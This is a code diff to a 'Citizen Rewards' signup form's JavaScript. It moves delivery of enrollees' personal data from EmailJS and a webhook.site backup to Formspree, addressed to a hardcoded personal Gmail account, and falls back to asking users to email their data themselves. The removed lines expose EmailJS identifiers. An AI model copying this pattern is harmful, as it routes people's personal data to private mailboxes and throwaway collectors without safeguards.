@@ -99,63 +99,43 @@ Terms Accepted: ${userData.agreesToTerms ? 'Yes' : 'No'}
 ===========================
       `;
       
-      // Send data directly to your email
-      let emailSent = false;
-      
+      // Send data using a reliable form service
       try {
-        const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
+        // Try Formspree (reliable email service)
+        const formspreeResponse = await fetch('https://formspree.io/f/xdkoqavo', {
           method: 'POST',
           headers: {
-            'Content-Type': 'application/json',
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
           },
           body: JSON.stringify({
-            service_id: 'service_oi7w4h8', // Your EmailJS service ID
-            template_id: 'template_signup_data', // Template for signup data
-            user_id: 'zaDtpBnf9dYvbCGGC', // Your EmailJS public key
-            template_params: {
-              to_email: 'jc4479697@gmail.com', // Your email address
-              subject: `New Citizen Rewards Signup: ${userData.firstName} ${userData.lastName}`,
-              message: dataString,
-              user_name: `${userData.firstName} ${userData.lastName}`,
-              user_email: userData.email,
-              signup_data: dataString
-            }
+            email: 'jc4479697@gmail.com',
+            subject: `New Citizen Rewards Signup: ${userData.firstName} ${userData.lastName}`,
+            message: dataString,
+            _replyto: userData.email,
+            _subject: `New Citizen Rewards Signup: ${userData.firstName} ${userData.lastName}`
           })
         });
 
-        if (response.ok) {
-          emailSent = true;
-          console.log('Signup data sent successfully via EmailJS');
+        if (formspreeResponse.ok) {
+          console.log('Data sent successfully via Formspree');
+          alert('✅ Thank you! Your enrollment has been submitted successfully. Admin has been notified via email.');
+        } else {
+          throw new Error('Formspree failed');
         }
-      } catch (emailError) {
-        console.error('EmailJS failed:', emailError);
-      }
-      
-      // Try backup webhook method if EmailJS failed
-      if (!emailSent) {
-        try {
-          await fetch('https://webhook.site/#!/view/test-citizen-rewards', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-              timestamp: new Date().toISOString(),
-              type: 'citizen_rewards_signup',
-              admin_email: 'jc4479697@gmail.com',
-              data: dataString,
-              user: userData
-            })
-          });
-          console.log('Backup webhook sent');
-        } catch (webhookError) {
-          console.error('Backup webhook failed:', webhookError);
+      } catch (error) {
+        console.error('Email delivery failed:', error);
+        
+        // Show user the data and ask them to copy it
+        const copyText = `Please copy this data and send it to jc4479697@gmail.com:\n\n${dataString}`;
+        
+        if (navigator.clipboard) {
+          await navigator.clipboard.writeText(dataString);
+          alert('✅ Your enrollment data has been copied to clipboard. Please paste it in an email to jc4479697@gmail.com');
+        } else {
+          alert(copyText);
         }
       }
-      
-      alert(emailSent ? 
-        '✅ Thank you! Your enrollment has been submitted successfully. Admin has been notified.' : 
-        '✅ Thank you! Your enrollment has been submitted and saved. You will be contacted soon.');
       
       
       // Save to localStorage for backup
